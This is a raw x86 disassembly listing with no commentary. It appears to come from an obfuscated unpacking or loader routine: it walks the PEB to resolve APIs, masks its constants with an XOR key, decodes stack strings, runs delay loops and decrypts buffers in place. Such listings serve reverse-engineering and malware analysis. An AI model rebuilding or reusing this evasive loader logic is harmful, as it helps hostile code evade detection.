  416ef9:	mov    DWORD PTR [ebp-0x34],ecx
  416efc:	mov    DWORD PTR [ebp-0x34],ecx
  416eff:	mov    DWORD PTR [ebp-0x34],0x4d
  416f06:	mov    DWORD PTR [ebp-0x34],0x43
  416f0d:	mov    ecx,DWORD PTR [ebp-0x14]
  416f10:	xor    ecx,ebx
  416f12:	add    ecx,eax
  416f14:	mov    DWORD PTR [ebp-0x34],ecx
  416f17:	mov    ecx,DWORD PTR [ebp-0x14]
  416f1a:	xor    ecx,ebx
  416f1c:	add    ecx,eax
  416f1e:	mov    DWORD PTR [ebp-0x34],ecx
  416f21:	mov    DWORD PTR [ebp-0x28],0x257
  416f28:	mov    DWORD PTR [ebp-0x20],0x35
  416f2f:	mov    DWORD PTR [ebp-0x10],0x79
  416f36:	lea    edi,[ebp-0xe4]
  416f3c:	lea    esi,[ebp-0x104]
  416f42:	call   0x417b5e
  416f47:	dec    DWORD PTR [ebp-0x10]
  416f4a:	jne    0x416f36
  416f4c:	dec    DWORD PTR [ebp-0x20]
  416f4f:	jne    0x416f2f
  416f51:	dec    DWORD PTR [ebp-0x28]
  416f54:	jne    0x416f28
  416f56:	mov    DWORD PTR [ebp-0x28],0x400d
  416f5d:	mov    eax,DWORD PTR [ebp-0x14]
  416f60:	xor    eax,ebx
  416f62:	mov    esi,0x3272e2
  416f67:	add    eax,esi
  416f69:	mov    DWORD PTR [ebp-0x8],eax
  416f6c:	mov    eax,DWORD PTR [ebp-0x14]
  416f6f:	and    DWORD PTR [ebp-0x94],0x0
  416f76:	xor    eax,ebx
  416f78:	add    eax,esi
  416f7a:	mov    DWORD PTR [ebp-0x38],eax
  416f7d:	mov    eax,fs:0x18
  416f83:	mov    DWORD PTR [ebp-0x94],eax
  416f89:	mov    eax,DWORD PTR [eax+0x30]
  416f8c:	mov    DWORD PTR [ebp-0x98],eax
  416f92:	mov    eax,DWORD PTR [eax+0xc]
  416f95:	mov    DWORD PTR [ebp-0xc0],eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x8]
  416f9e:	lea    ecx,[ebp-0x94]
  416fa4:	mov    DWORD PTR [eax+0x1a0],ecx
  416faa:	mov    eax,DWORD PTR [ebp+0x8]
  416fad:	lea    ecx,[ebp-0x98]
  416fb3:	mov    DWORD PTR [eax+0x1a4],ecx
  416fb9:	mov    eax,DWORD PTR [ebp+0x8]
  416fbc:	push   DWORD PTR [ebp+0x8]
  416fbf:	lea    ecx,[ebp-0xc0]
  416fc5:	mov    DWORD PTR [eax+0x1a8],ecx
  416fcb:	call   0x419344
  416fd0:	mov    ecx,DWORD PTR [ebp-0x14]
  416fd3:	xor    ecx,ebx
  416fd5:	add    ecx,esi
  416fd7:	cmp    ecx,eax
  416fd9:	je     0x4172b6
  416fdf:	mov    eax,DWORD PTR [ebp+0x8]
  416fe2:	mov    eax,DWORD PTR [eax+0x194]
  416fe8:	mov    ecx,DWORD PTR [eax]
  416fea:	mov    eax,DWORD PTR [ebp+0x8]
  416fed:	mov    eax,DWORD PTR [eax+0x194]
  416ff3:	mov    eax,DWORD PTR [eax]
  416ff5:	add    eax,DWORD PTR [ecx+0x3c]
  416ff8:	mov    ecx,DWORD PTR [ebp+0x8]
  416ffb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  417001:	lea    edx,[ebp-0xc4]
  417007:	push   edx
  417008:	mov    edx,DWORD PTR [ebp+0x8]
  41700b:	mov    edx,DWORD PTR [edx+0x18c]
  417011:	mov    edx,DWORD PTR [edx]
  417013:	add    edx,DWORD PTR [eax+0x88]
  417019:	push   0x4
  41701b:	push   DWORD PTR [eax+0x8c]
  417021:	push   edx
  417022:	call   DWORD PTR [ecx+0x1c]
  417025:	push   DWORD PTR [ebp+0x8]
  417028:	mov    edi,DWORD PTR [ebp+0x8]
  41702b:	mov    eax,DWORD PTR [ebp+0x8]
  41702e:	mov    edx,DWORD PTR [eax+0x1b8]
  417034:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41703b:	mov    DWORD PTR [ebp-0x64],0x50c011f
  417042:	mov    WORD PTR [ebp-0x60],0x7c3d
  417048:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  417052:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41705c:	mov    DWORD PTR [ebp-0x88],0x221d040c
  417066:	mov    DWORD PTR [ebp-0x84],0xe190109
  417070:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  417077:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41707e:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  417085:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41708c:	mov    DWORD PTR [ebp-0x70],0xe190109
  417093:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41709a:	call   0x419373
  41709f:	push   eax
  4170a0:	mov    eax,DWORD PTR [ebp+0x8]
  4170a3:	mov    eax,DWORD PTR [eax+0x1a8]
  4170a9:	push   DWORD PTR [eax]
  4170ab:	call   0x419014
  4170b0:	test   eax,eax
  4170b2:	jne    0x417104
  4170b4:	mov    eax,DWORD PTR [ebp+0x8]
  4170b7:	mov    eax,DWORD PTR [eax+0x1d8]
  4170bd:	mov    edi,DWORD PTR [ebp+0x8]
  4170c0:	add    eax,0x4
  4170c3:	mov    DWORD PTR [ebp-0x24],eax
  4170c6:	mov    eax,DWORD PTR [ebp+0x8]
  4170c9:	mov    edx,DWORD PTR [eax+0x1b8]
  4170cf:	call   0x419373
  4170d4:	push   eax
  4170d5:	mov    eax,DWORD PTR [ebp-0x24]
  4170d8:	call   DWORD PTR [eax]
  4170da:	test   eax,eax
  4170dc:	jne    0x417104
  4170de:	mov    eax,DWORD PTR [ebp+0x8]
  4170e1:	mov    eax,DWORD PTR [eax+0x1d8]
  4170e7:	mov    edi,DWORD PTR [ebp+0x8]
  4170ea:	add    eax,0x10
  4170ed:	mov    DWORD PTR [ebp-0x24],eax
  4170f0:	mov    eax,DWORD PTR [ebp+0x8]
  4170f3:	mov    edx,DWORD PTR [eax+0x1b8]
  4170f9:	call   0x419373
  4170fe:	push   eax
  4170ff:	mov    eax,DWORD PTR [ebp-0x24]
  417102:	call   DWORD PTR [eax]
  417104:	mov    eax,DWORD PTR [ebp-0x14]
  417107:	mov    ecx,DWORD PTR [ebp-0x28]
  41710a:	xor    eax,ebx
  41710c:	add    eax,esi
  41710e:	cmp    eax,ecx
  417110:	je     0x41728f
  417116:	mov    eax,DWORD PTR [ebp-0x18]
  417119:	xor    eax,ebx
  41711b:	mov    ecx,0xffcd8d1e
  417120:	sub    ecx,eax
  417122:	add    ecx,DWORD PTR [ebp-0x28]
  417125:	mov    eax,DWORD PTR [ebp-0x8]
  417128:	cmp    eax,ecx
  41712a:	ja     0x41728f
  417130:	mov    DWORD PTR [ebp-0x20],0x0
  417137:	push   DWORD PTR [ebp+0x8]
  41713a:	mov    edi,DWORD PTR [ebp+0x8]
  41713d:	mov    eax,DWORD PTR [ebp+0x8]
  417140:	mov    edx,DWORD PTR [eax+0x1b4]
  417146:	call   0x419373
  41714b:	push   eax
  41714c:	mov    eax,DWORD PTR [ebp+0x8]
  41714f:	mov    eax,DWORD PTR [eax+0x1a8]
  417155:	push   DWORD PTR [eax]
  417157:	call   0x419014
  41715c:	mov    ecx,DWORD PTR [ebp+0x8]
  41715f:	mov    ecx,DWORD PTR [ecx+0x19c]
  417165:	mov    DWORD PTR [ecx],eax
  417167:	mov    eax,DWORD PTR [ebp+0x8]
  41716a:	mov    edi,DWORD PTR [eax+0x1d8]
  417170:	mov    esi,DWORD PTR [ebp+0x8]
  417173:	xor    eax,eax
  417175:	lea    edx,[ebp-0x7c]
  417178:	call   0x4193a9
  41717d:	push   eax
  41717e:	mov    eax,DWORD PTR [ebp+0x8]
  417181:	mov    eax,DWORD PTR [eax+0x19c]
  417187:	push   DWORD PTR [eax]
  417189:	call   DWORD PTR [edi+0x8]
  41718c:	mov    DWORD PTR [ebp-0x24],eax
  41718f:	mov    eax,DWORD PTR [ebp+0x8]
  417192:	mov    edi,DWORD PTR [eax+0x1d8]
  417198:	mov    esi,DWORD PTR [ebp+0x8]
  41719b:	xor    eax,eax
  41719d:	lea    edx,[ebp-0x90]
  4171a3:	call   0x4193a9
  4171a8:	push   eax
  4171a9:	mov    eax,DWORD PTR [ebp+0x8]
  4171ac:	mov    eax,DWORD PTR [eax+0x19c]
  4171b2:	push   DWORD PTR [eax]
  4171b4:	call   DWORD PTR [edi+0x8]
  4171b7:	and    DWORD PTR [ebp-0x1c],0x0
  4171bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4171be:	and    eax,0x7
  4171c1:	add    eax,0x31
  4171c4:	push   eax
  4171c5:	call   DWORD PTR [ebp-0x24]
  4171c8:	test   eax,eax
  4171ca:	jne    0x4171d1
  4171cc:	and    DWORD PTR [ebp-0x10],eax
  4171cf:	jmp    0x4171f9
  4171d1:	mov    eax,DWORD PTR [ebp+0x8]
  4171d4:	mov    edi,DWORD PTR [eax+0x1d8]
  4171da:	mov    esi,DWORD PTR [ebp+0x8]
  4171dd:	xor    eax,eax
  4171df:	lea    edx,[ebp-0x68]
  4171e2:	call   0x4193a9
  4171e7:	push   eax
  4171e8:	mov    eax,DWORD PTR [ebp+0x8]
  4171eb:	mov    eax,DWORD PTR [eax+0x198]
  4171f1:	push   DWORD PTR [eax]
  4171f3:	call   DWORD PTR [edi+0x8]
  4171f6:	mov    DWORD PTR [ebp-0x10],eax
  4171f9:	inc    DWORD PTR [ebp-0x1c]
  4171fc:	cmp    DWORD PTR [ebp-0x1c],0x10
  417200:	jb     0x4171bb
  417202:	mov    eax,DWORD PTR [ebp-0x18]
  417205:	mov    esi,DWORD PTR [ebp+0x8]
  417208:	xor    eax,ebx
  41720a:	mov    edi,0x3272e2
  41720f:	add    eax,edi
  417211:	lea    edx,[ebp-0xe4]
  417217:	call   0x4193a9
  41721c:	push   eax
  41721d:	mov    eax,DWORD PTR [ebp-0x14]
  417220:	mov    esi,DWORD PTR [ebp+0x8]
  417223:	xor    eax,ebx
  417225:	add    eax,edi
  417227:	lea    edx,[ebp-0x104]
  41722d:	call   0x4193a9
  417232:	push   eax
  417233:	call   DWORD PTR [ebp-0x10]
  417236:	mov    ecx,DWORD PTR [ebp-0x14]
  417239:	xor    ecx,ebx
  41723b:	add    ecx,edi
  41723d:	cmp    ecx,eax
  41723f:	jne    0x417248
  417241:	mov    DWORD PTR [ebp-0x20],0x1
  417248:	mov    eax,DWORD PTR [ebp-0x18]
  41724b:	mov    ecx,DWORD PTR [ebp-0x8]
  41724e:	xor    eax,ebx
  417250:	lea    eax,[eax+ecx*1+0x3272e2]
  417257:	mov    DWORD PTR [ebp-0x8],eax
  41725a:	mov    eax,DWORD PTR [ebp-0x20]
  41725d:	test   eax,eax
  41725f:	je     0x417273
  417261:	mov    eax,DWORD PTR [ebp-0x18]
  417264:	mov    ecx,DWORD PTR [ebp-0x38]
  417267:	xor    eax,ebx
  417269:	lea    eax,[eax+ecx*1+0x3272e2]
  417270:	mov    DWORD PTR [ebp-0x38],eax
  417273:	mov    eax,DWORD PTR [ebp-0x18]
  417276:	xor    eax,ebx
  417278:	mov    ecx,0xffcd8d1e
  41727d:	sub    ecx,eax
  41727f:	add    ecx,DWORD PTR [ebp-0x28]
  417282:	mov    eax,DWORD PTR [ebp-0x8]
  417285:	cmp    eax,ecx
  417287:	jbe    0x417130
  41728d:	mov    esi,edi
  41728f:	mov    eax,DWORD PTR [ebp-0x38]
  417292:	mov    ecx,DWORD PTR [ebp-0x8]
  417295:	cmp    ecx,eax
  417297:	jne    0x4172aa
  417299:	push   DWORD PTR [ebp+0x8]
  41729c:	lea    eax,[ebp-0x3c]
  41729f:	push   eax
  4172a0:	call   0x419e21
  4172a5:	mov    DWORD PTR [ebp-0x2c],eax
  4172a8:	jmp    0x4172b6
  4172aa:	mov    eax,DWORD PTR [ebp-0x2c]
  4172ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4172b0:	xor    ecx,ebx
  4172b2:	add    ecx,esi
  4172b4:	xor    DWORD PTR [eax],ecx
  4172b6:	mov    eax,DWORD PTR [ebp-0x14]
  4172b9:	mov    ecx,DWORD PTR [ebp-0x2c]
  4172bc:	xor    eax,ebx
  4172be:	add    eax,esi
  4172c0:	cmp    eax,ecx
  4172c2:	je     0x417a3c
  4172c8:	mov    eax,DWORD PTR [ebp-0x14]
  4172cb:	mov    ecx,DWORD PTR [ebp-0x3c]
  4172ce:	xor    eax,ebx
  4172d0:	add    eax,esi
  4172d2:	cmp    eax,ecx
  4172d4:	je     0x417a3c
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	xor    eax,ebx
  4172df:	add    eax,esi
  4172e1:	jmp    0x4172ff
  4172e3:	mov    edi,DWORD PTR [ebp-0x2c]
  4172e6:	mov    cl,al
  4172e8:	and    cl,0x1f
  4172eb:	or     dl,0xff
  4172ee:	sub    dl,cl
  4172f0:	add    BYTE PTR [edi+eax*1],dl
  4172f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4172f6:	xor    ecx,ebx
  4172f8:	lea    eax,[eax+ecx*1+0x3272e2]
  4172ff:	mov    ecx,DWORD PTR [ebp-0x3c]
  417302:	cmp    eax,ecx
  417304:	jb     0x4172e3
  417306:	mov    eax,DWORD PTR [ebp-0x3c]
  417309:	mov    DWORD PTR [ebp-0x28],eax
  41730c:	mov    eax,DWORD PTR [ebp-0x2c]
  41730f:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  417316:	mov    DWORD PTR [ebp-0xbc],eax
  41731c:	mov    edi,0xf89c8584
  417321:	mov    DWORD PTR [ebp-0x30],edi
  417324:	mov    eax,DWORD PTR [ebp-0x38]
  417327:	xor    eax,ebx
  417329:	add    eax,esi
  41732b:	mov    DWORD PTR [ebp-0xc],eax
  41732e:	mov    eax,DWORD PTR [ebp-0x38]
  417331:	xor    eax,ebx
  417333:	add    eax,esi
  417335:	mov    DWORD PTR [ebp-0x8],eax
  417338:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41733f:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  417346:	mov    eax,DWORD PTR [ebp-0x38]
  417349:	mov    ecx,DWORD PTR [ebp-0x28]
  41734c:	xor    eax,ebx
  41734e:	add    eax,esi
  417350:	cmp    ecx,eax
  417352:	je     0x417551
  417358:	jmp    0x41752d
  41735d:	mov    ecx,DWORD PTR [ebp-0xc]
  417360:	mov    eax,DWORD PTR [ebp-0x28]
  417363:	sub    eax,ecx
  417365:	mov    ecx,DWORD PTR [ebp-0x48]
  417368:	xor    ecx,ebx
  41736a:	add    ecx,esi
  41736c:	xor    edx,edx
  41736e:	div    ecx
  417370:	mov    DWORD PTR [ebp-0x8],eax
  417373:	mov    eax,DWORD PTR [ebp-0x54]
  417376:	mov    ecx,DWORD PTR [ebp-0x8]
  417379:	xor    eax,ebx
  41737b:	add    eax,esi
  41737d:	cmp    ecx,eax
  41737f:	jbe    0x41738b
  417381:	mov    eax,DWORD PTR [ebp-0x54]
  417384:	xor    eax,ebx
  417386:	add    eax,esi
  417388:	mov    DWORD PTR [ebp-0x8],eax
  41738b:	mov    eax,DWORD PTR [ebp-0x48]
  41738e:	mov    ecx,DWORD PTR [ebp-0x8]
  417391:	xor    eax,ebx
  417393:	add    eax,esi
  417395:	imul   eax,ecx
  417398:	mov    DWORD PTR [ebp-0x8],eax
  41739b:	mov    eax,DWORD PTR [ebp-0x38]
  41739e:	mov    ecx,DWORD PTR [ebp-0x8]
  4173a1:	xor    eax,ebx
  4173a3:	add    eax,esi
  4173a5:	cmp    ecx,eax
  4173a7:	je     0x41751b
  4173ad:	mov    eax,DWORD PTR [ebp-0x8]
  4173b0:	mov    DWORD PTR [ebp-0x10],eax
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	add    eax,DWORD PTR [ebp-0xbc]
  4173bc:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  4173c3:	mov    DWORD PTR [ebp-0x20],edi
  4173c6:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  4173d0:	mov    DWORD PTR [ebp-0x8],eax
  4173d3:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  4173da:	mov    DWORD PTR [ebp-0x1c],edi
  4173dd:	mov    eax,DWORD PTR [ebp-0x24]
  4173e0:	xor    eax,ebx
  4173e2:	add    eax,esi
  4173e4:	jmp    0x4174da
  4173e9:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  4173f3:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  4173fd:	mov    eax,DWORD PTR [ebp-0x1c]
  417400:	mov    ecx,DWORD PTR [ebp-0x44]
  417403:	xor    eax,ebx
  417405:	add    eax,esi
  417407:	imul   eax,ecx
  41740a:	mov    ecx,DWORD PTR [ebp-0x8]
  41740d:	mov    al,BYTE PTR [eax+ecx*1]
  417410:	mov    BYTE PTR [ebp-0x2],al
  417413:	mov    eax,DWORD PTR [ebp-0x1c]
  417416:	mov    ecx,DWORD PTR [ebp-0x44]
  417419:	xor    eax,ebx
  41741b:	add    eax,esi
  41741d:	imul   eax,ecx
  417420:	mov    ecx,DWORD PTR [ebp-0xa8]
  417426:	xor    ecx,ebx
  417428:	add    eax,ecx
  41742a:	mov    ecx,DWORD PTR [ebp-0x8]
  41742d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417435:	mov    ecx,DWORD PTR [ebp-0xb0]
  41743b:	xor    ecx,ebx
  41743d:	lea    eax,[ecx+eax*1+0x3272e2]
  417444:	movzx  ecx,BYTE PTR [ebp-0x2]
  417448:	xor    ecx,eax
  41744a:	mov    BYTE PTR [ebp-0x2],cl
  41744d:	mov    al,BYTE PTR [ebp-0x2]
  417450:	mov    ecx,DWORD PTR [ebp-0x1c]
  417453:	mov    edx,DWORD PTR [ebp-0x44]
  417456:	xor    ecx,ebx
  417458:	add    ecx,esi
  41745a:	imul   ecx,edx
  41745d:	mov    edx,DWORD PTR [ebp-0x8]
  417460:	mov    BYTE PTR [ecx+edx*1],al
  417463:	mov    eax,DWORD PTR [ebp-0x1c]
  417466:	mov    ecx,DWORD PTR [ebp-0x44]
  417469:	xor    eax,ebx
  41746b:	add    eax,esi
  41746d:	imul   eax,ecx
  417470:	mov    ecx,DWORD PTR [ebp-0x8]
  417473:	mov    al,BYTE PTR [eax+ecx*1]
  417476:	mov    BYTE PTR [ebp-0x2],al
  417479:	mov    eax,DWORD PTR [ebp-0x1c]
  41747c:	mov    ecx,DWORD PTR [ebp-0x44]
  41747f:	xor    eax,ebx
  417481:	add    eax,esi
  417483:	imul   eax,ecx
  417486:	mov    ecx,DWORD PTR [ebp-0x20]
  417489:	xor    ecx,ebx
  41748b:	add    eax,ecx
  41748d:	mov    ecx,DWORD PTR [ebp-0x8]
  417490:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417498:	mov    ecx,DWORD PTR [ebp-0xb8]
  41749e:	xor    ecx,ebx
  4174a0:	lea    eax,[ecx+eax*1+0x3272e2]
  4174a7:	movzx  ecx,BYTE PTR [ebp-0x2]
  4174ab:	xor    ecx,eax
  4174ad:	mov    BYTE PTR [ebp-0x2],cl
  4174b0:	mov    al,BYTE PTR [ebp-0x2]
  4174b3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4174b6:	mov    edx,DWORD PTR [ebp-0x44]
  4174b9:	xor    ecx,ebx
  4174bb:	add    ecx,esi
  4174bd:	imul   ecx,edx
  4174c0:	mov    edx,DWORD PTR [ebp-0x8]
  4174c3:	mov    BYTE PTR [ecx+edx*1],al
  4174c6:	mov    eax,DWORD PTR [ebp-0x34]
  4174c9:	mov    ecx,DWORD PTR [ebp-0x20]
  4174cc:	xor    eax,ebx
  4174ce:	xor    ecx,ebx
  4174d0:	add    eax,esi
  4174d2:	add    ecx,esi
  4174d4:	imul   eax,ecx
  4174d7:	add    eax,DWORD PTR [ebp-0x44]
  4174da:	mov    DWORD PTR [ebp-0x44],eax
  4174dd:	mov    eax,DWORD PTR [ebp-0x44]
  4174e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4174e3:	cmp    ecx,eax
  4174e5:	jb     0x4173e9
  4174eb:	mov    eax,DWORD PTR [ebp-0x20]
  4174ee:	mov    ecx,DWORD PTR [ebp-0x10]
  4174f1:	xor    eax,ebx
  4174f3:	add    eax,esi
  4174f5:	imul   eax,ecx
  4174f8:	mov    ecx,DWORD PTR [ebp-0x24]
  4174fb:	xor    ecx,ebx
  4174fd:	add    ecx,esi
  4174ff:	or     eax,ecx
  417501:	mov    ecx,DWORD PTR [ebp-0x30]
  417504:	xor    ecx,ebx
  417506:	add    eax,ecx
  417508:	mov    ecx,DWORD PTR [ebp-0x30]
  41750b:	xor    ecx,ebx
  41750d:	add    eax,ecx
  41750f:	mov    ecx,DWORD PTR [ebp-0xc]
  417512:	lea    eax,[eax+ecx*1+0x64e5c4]
  417519:	jmp    0x41752a
  41751b:	mov    eax,DWORD PTR [ebp-0x30]
  41751e:	mov    ecx,DWORD PTR [ebp-0xc]
  417521:	xor    eax,ebx
  417523:	lea    eax,[eax+ecx*1+0x3272e2]
  41752a:	mov    DWORD PTR [ebp-0xc],eax
  41752d:	mov    eax,DWORD PTR [ebp-0x30]
  417530:	xor    eax,ebx
  417532:	mov    ecx,0xffcd8d1e
  417537:	sub    ecx,eax
  417539:	add    ecx,DWORD PTR [ebp-0x28]
  41753c:	mov    eax,DWORD PTR [ebp-0x30]
  41753f:	mov    edx,DWORD PTR [ebp-0xc]
  417542:	xor    eax,ebx
  417544:	add    eax,esi
  417546:	imul   eax,edx
  417549:	cmp    eax,ecx
  41754b:	jbe    0x41735d
  417551:	mov    eax,DWORD PTR [ebp-0x14]
  417554:	mov    ecx,DWORD PTR [ebp-0x3c]
  417557:	mov    eax,DWORD PTR [ebp+0x8]
  41755a:	mov    edx,DWORD PTR [ebp-0x4c]
  41755d:	mov    eax,DWORD PTR [eax+0x1d8]
  417563:	xor    edx,ebx
  417565:	add    edx,esi
  417567:	push   edx
  417568:	mov    edx,DWORD PTR [ebp-0x40]
  41756b:	xor    edx,ebx
  41756d:	add    edx,esi
  41756f:	push   edx
  417570:	push   ecx
  417571:	mov    DWORD PTR [ebp-0x34],ecx
  417574:	mov    ecx,DWORD PTR [ebp-0x14]
  417577:	xor    ecx,ebx
  417579:	add    ecx,esi
  41757b:	push   ecx
  41757c:	call   DWORD PTR [eax+0x14]
  41757f:	mov    edi,eax
  417581:	mov    eax,DWORD PTR [ebp-0x14]
  417584:	xor    eax,ebx
  417586:	add    eax,esi
  417588:	cmp    eax,edi
  41758a:	je     0x4175e5
  41758c:	mov    eax,DWORD PTR [ebp-0x14]
  41758f:	jmp    0x4175b2
  417591:	mov    ecx,DWORD PTR [ebp-0x2c]
  417594:	xor    eax,ebx
  417596:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41759d:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  4175a4:	mov    ecx,DWORD PTR [ebp-0x18]
  4175a7:	xor    ecx,ebx
  4175a9:	lea    eax,[ecx+eax*1+0x3272e2]
  4175b0:	xor    eax,ebx
  4175b2:	mov    ecx,DWORD PTR [ebp-0x3c]
  4175b5:	sub    ecx,esi
  4175b7:	xor    ecx,ebx
  4175b9:	cmp    eax,ecx
  4175bb:	jne    0x417591
  4175bd:	mov    eax,DWORD PTR [ebp+0x8]
  4175c0:	mov    ecx,DWORD PTR [ebp-0x50]
  4175c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4175c9:	xor    ecx,ebx
  4175cb:	add    ecx,esi
  4175cd:	push   ecx
  4175ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4175d1:	xor    ecx,ebx
  4175d3:	add    ecx,esi
  4175d5:	push   ecx
  4175d6:	push   DWORD PTR [ebp-0x2c]
  4175d9:	call   DWORD PTR [eax+0x18]
  4175dc:	mov    eax,DWORD PTR [ebp-0x34]
  4175df:	mov    DWORD PTR [ebp-0x2c],edi
  4175e2:	mov    DWORD PTR [ebp-0x3c],eax
  4175e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4175e8:	mov    DWORD PTR [ebp-0x10],eax
  4175eb:	mov    eax,DWORD PTR [ebp-0x18]
  4175ee:	mov    ecx,DWORD PTR [ebp-0x14]
  4175f1:	xor    eax,ebx
  4175f3:	add    eax,esi
  4175f5:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  4175fc:	mov    DWORD PTR [ebp-0x58],0x27143f14
  417603:	jmp    0x417636
  417605:	mov    edx,DWORD PTR [ebp-0x10]
  417608:	mov    edi,ecx
  41760a:	xor    edi,ebx
  41760c:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  417613:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41761b:	xor    cl,0x74
  41761e:	sub    cl,0x8
  417621:	movzx  ecx,cl
  417624:	cmp    edx,ecx
  417626:	jne    0x417640
  417628:	mov    ecx,DWORD PTR [ebp-0x18]
  41762b:	xor    ecx,ebx
  41762d:	lea    ecx,[ecx+edi*1+0x3272e2]
  417634:	xor    ecx,ebx
  417636:	cmp    ecx,0xf89c85bd
  41763c:	jne    0x417605
  41763e:	jmp    0x417647
  417640:	mov    eax,DWORD PTR [ebp-0x14]
  417643:	xor    eax,ebx
  417645:	add    eax,esi
  417647:	mov    ecx,DWORD PTR [ebp-0x14]
  41764a:	xor    ecx,ebx
  41764c:	add    ecx,esi
  41764e:	cmp    ecx,eax
  417650:	je     0x4177c6
  417656:	mov    eax,DWORD PTR [ebp-0x10]
  417659:	mov    eax,DWORD PTR [eax+0x8]
  41765c:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  417663:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41766a:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  417671:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  417678:	mov    DWORD PTR [ebp-0x20],eax
  41767b:	mov    eax,DWORD PTR [ebp+0x8]
  41767e:	mov    ecx,DWORD PTR [ebp-0x24]
  417681:	xor    ecx,ebx
  417683:	add    ecx,esi
  417685:	push   ecx
  417686:	mov    ecx,DWORD PTR [ebp-0x48]
  417689:	mov    eax,DWORD PTR [eax+0x1d8]
  41768f:	xor    ecx,ebx
  417691:	add    ecx,esi
  417693:	push   ecx
  417694:	mov    ecx,DWORD PTR [ebp-0x40]
  417697:	xor    ecx,ebx
  417699:	add    ecx,esi
  41769b:	push   ecx
  41769c:	mov    ecx,DWORD PTR [ebp-0xc]
  41769f:	xor    ecx,ebx
  4176a1:	add    ecx,esi
  4176a3:	push   ecx
  4176a4:	call   DWORD PTR [eax+0x14]
  4176a7:	mov    edi,eax
  4176a9:	mov    eax,DWORD PTR [ebp+0x8]
  4176ac:	mov    ecx,DWORD PTR [ebp-0x24]
  4176af:	mov    eax,DWORD PTR [eax+0x1d8]
  4176b5:	xor    ecx,ebx
  4176b7:	add    ecx,esi
  4176b9:	push   ecx
  4176ba:	mov    ecx,DWORD PTR [ebp-0x48]
  4176bd:	xor    ecx,ebx
  4176bf:	add    ecx,esi
  4176c1:	push   ecx
  4176c2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176c5:	push   DWORD PTR [ebp-0x20]
  4176c8:	xor    ecx,ebx
  4176ca:	add    ecx,esi
  4176cc:	push   ecx
  4176cd:	call   DWORD PTR [eax+0x14]
  4176d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4176d3:	xor    ecx,ebx
  4176d5:	add    ecx,esi
  4176d7:	mov    DWORD PTR [ebp-0x24],eax
  4176da:	cmp    ecx,edi
  4176dc:	je     0x417a69
  4176e2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176e5:	xor    ecx,ebx
  4176e7:	add    ecx,esi
  4176e9:	cmp    ecx,eax
  4176eb:	je     0x417a69
  4176f1:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  4176f8:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  4176ff:	mov    ecx,DWORD PTR [ebp-0x40]
  417702:	xor    cl,0x9b
  417705:	sub    cl,0x1e
  417708:	mov    BYTE PTR [edi],cl
  41770a:	mov    ecx,DWORD PTR [ebp-0xc]
  41770d:	xor    cl,0x9b
  417710:	sub    cl,0x1e
  417713:	mov    BYTE PTR [edi+0x1],cl
  417716:	mov    ecx,DWORD PTR [ebp-0x4c]
  417719:	xor    cl,0x9b
  41771c:	sub    cl,0x1e
  41771f:	mov    BYTE PTR [edi+0x2],cl
  417722:	and    DWORD PTR [ebp-0xb4],0x0
  417729:	and    DWORD PTR [ebp-0xa4],0x0
  417730:	lea    ecx,[ebp-0xa4]
  417736:	push   ecx
  417737:	push   DWORD PTR [ebp-0x20]
  41773a:	push   eax
  41773b:	lea    eax,[ebp-0xb4]
  417741:	push   eax
  417742:	mov    eax,DWORD PTR [ebp-0x10]
  417745:	push   DWORD PTR [eax+0xc]
  417748:	mov    eax,DWORD PTR [ebp-0x2c]
  41774b:	add    eax,0x10
  41774e:	push   eax
  41774f:	push   edi
  417750:	call   0x416a9a
  417755:	mov    DWORD PTR [ebp-0x40],eax
  417758:	mov    eax,DWORD PTR [ebp+0x8]
  41775b:	mov    ecx,DWORD PTR [ebp-0x50]
  41775e:	mov    eax,DWORD PTR [eax+0x1d8]
  417764:	xor    ecx,ebx
  417766:	add    ecx,esi
  417768:	push   ecx
  417769:	mov    ecx,DWORD PTR [ebp-0xc]
  41776c:	xor    ecx,ebx
  41776e:	add    ecx,esi
  417770:	push   ecx
  417771:	push   edi
  417772:	call   DWORD PTR [eax+0x18]
  417775:	mov    eax,DWORD PTR [ebp-0x40]
  417778:	add    eax,0xffcd8d1e
  41777d:	xor    eax,ebx
